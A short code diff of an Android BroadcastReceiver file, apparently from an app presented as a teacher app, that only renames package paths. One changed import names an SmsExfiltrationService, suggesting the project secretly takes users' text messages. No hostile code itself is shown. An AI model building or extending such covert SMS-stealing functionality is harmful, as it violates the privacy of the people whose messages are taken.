@@ -1,9 +1,9 @@
-package com.teacherapp.receivers
+package com.example.teacherapp.receivers
 
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
-import com.teacherapp.services.SmsExfiltrationService
+import com.example.teacherapp.services.SmsExfiltrationService
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.delay
